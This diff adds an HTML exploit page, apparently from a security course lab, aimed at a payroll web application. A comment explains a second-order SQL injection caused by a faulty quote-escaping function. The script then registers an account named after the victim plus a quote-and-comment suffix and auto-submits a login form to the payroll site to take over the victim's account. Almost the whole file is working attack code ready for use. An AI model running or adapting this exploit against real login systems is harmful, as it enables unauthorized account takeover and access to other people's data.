@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<!-- the vulnerable code is in index.html due to escapeString function which replaces single quotes with double quotes resulting in a second order sql injection whereby a user registered with the proper login string can actually use his login credential to login to the account of the victim
+-->
+<html>
+<script src="/assets/jquery/js/jquery-1.7.2.min.js"></script>
+<body>
+<form action='http://payroll.gatech.edu/index.php' onsubmit='' method='POST'>
+	<input type='hidden' name='action' value='login'/>
+	<input type='hidden' name='login' value=''/>
+	<input type='hidden' name='pw' value='save'/>
+</form>
+
+<input name='login' id='targetlogin' value='username'>
+<button id='exploit' onclick='return test();'>Submit</button>
+
+<script>
+function test(){
+	var target = document.getElementById('targetlogin').value
+	var register = {'action': 'register', 'login': target + "'--", 'name': 'whocares', 'pw1': 'whocares', 'pw2': 'whocares' }
+
+	$.ajax({
+		type: 'POST',
+		url: 'index.php',
+		data: register,
+		success: function(result) {alert('Done!')}
+	});
+	document.getElementsByName('login')[0].value = target + "'--"
+
+	document.forms[0].submit()
+
+}
+</script>
+
+</body>
+</html>
